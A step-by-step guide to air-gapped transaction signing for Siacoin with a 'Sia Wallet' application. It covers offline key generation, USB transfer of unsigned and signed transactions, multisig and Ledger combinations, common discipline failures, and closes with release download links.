# Air-Gapped Signing for Siacoin: A Step-by-Step Security Workflow

Air-gapped signing is the highest floor of self-custody security available for Siacoin — the model where your signing keys live on a machine that has never touched a network, full stop. It's worth understanding even if you don't need it today, because it's the workflow that watch-only and cold-storage setups are ultimately built around.

## The threat model this actually addresses

A normal software wallet, even a careful one, has private keys generated and stored on an internet-connected machine. That's fine for most holders, but it means the keys are theoretically reachable by anything that compromises that machine — malware, a malicious browser extension, a supply-chain attack on some unrelated piece of software you installed. Air-gapped signing removes that exposure entirely by making sure the machine that ever touches your keys never has a network interface active, period.

## Setting up the air-gapped side

Use a computer that's been offline since first boot — ideally something bought secondhand, wiped, and never networked at all, rather than an existing machine you disconnect just for this. Launch Sia Wallet with the `--cold` flag (or pick "Cold mode" on the welcome screen), which disables all networking code at startup regardless of whether the machine happens to have connectivity. Generate your seed here, record it on paper and ideally a steel backup too, and note your first several receive addresses before putting the device away somewhere physically secure.

## The signing workflow

1. **On your online, watch-only wallet:** load the cold wallet's public address as a watch-only account (Add Account → Watch-only → paste address). This gives you full visibility — balance, incoming alerts, transaction history — with the Send button disabled.
2. **Prepare a transaction:** Send → fill in recipient and amount → Export Unsigned Transaction. Save this to a USB stick.
3. **Move to the air-gapped machine:** plug in the stick, open Sia Wallet, and choose Import Transaction.
4. **Review carefully on-screen.** This is the step that matters most — check the recipient address and amount character by character against what you intended, since there's no undo once this ships. Sign.
5. **Export the signed transaction** back to the USB stick.
6. **Back on the online machine:** Import Transaction, then Broadcast.

At no point do your private keys touch a network connection, and the signing machine itself never goes online at any stage of this loop.

## Combining with multi-signature and Ledger

Air-gapped signing composes with the rest of Sia Wallet's advanced security tooling rather than replacing it. In an n-of-m multi-signature setup (up to 11-of-15, enforced by Sia's own consensus layer rather than by the wallet software), one or more of your signers can be air-gapped cold devices while others are [Ledgers](connect-ledger-to-siacoin-wallet.md) or software seeds — a common configuration is 2-of-3 with two hardware devices in separate physical locations plus one software backup. Tor routing (Advanced Settings → Network → Route through Tor, pointed at a locally running Tor daemon) is a separate, complementary layer that affects only your online wallet's network traffic, not your keys — your seed never transmits over any connection, Tor or otherwise, in any of these configurations.

## Where this workflow actually fails in practice

Air-gapped signing's security properties are only as good as the discipline behind them, and the most common way this setup fails isn't a technical flaw — it's the offline machine quietly becoming not-quite-offline. A signing machine that gets connected to a network "just once" to install an update, transfer a file a different way, or troubleshoot a problem has had its air gap broken for that entire session, and there's no way to retroactively know whether anything took advantage of that window. The discipline that makes this workflow worth doing at all is treating the offline machine as permanently offline, with the USB-stick transfer as the only sanctioned way data moves in or out — no exceptions for convenience, ever.

The second common failure is skipping the on-screen review at the signing step because it feels redundant after doing this a few times. That review — checking the recipient address and amount character by character before signing — is the one place in this entire workflow where a mistake becomes genuinely unrecoverable, since Sia has no transaction-reversal mechanism. Treat it as the step that can never become routine, however many times you've done it before.

## Where this workflow is overkill — and where it isn't

For everyday holdings, this is genuinely more process than most people need — a standard software wallet, or a software wallet paired with a single Ledger, covers the realistic threat model for most balances. Air-gapped signing earns its complexity for treasury-scale holdings, funds held in trust for other people, or situations where the cost of a compromised online machine would be catastrophic rather than merely bad. If you're not sure which category you're in, that's usually itself a sign you don't need the full air-gapped setup yet — watch-only accounts alone, paired with a single Ledger, cover most of the practical benefit with a fraction of the operational overhead.

**[Download Sia Wallet v2.12.0](https://github.com/Sia-Developments/SiaWallet/releases/tag/v2.12.0)** for [Windows](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.exe), [macOS](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.dmg), or [Linux](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.zip).

---

**Related:** [Setting up watch-only and cold-storage wallets](siacoin-watch-only-cold-storage-setup.md) · [Using a Ledger Nano with Siacoin](connect-ledger-to-siacoin-wallet.md) · [Recovering an old wallet seed](recover-old-siacoin-wallet-seed.md) · [Best Siacoin wallets compared](best-siacoin-wallet-2026-compared.md)
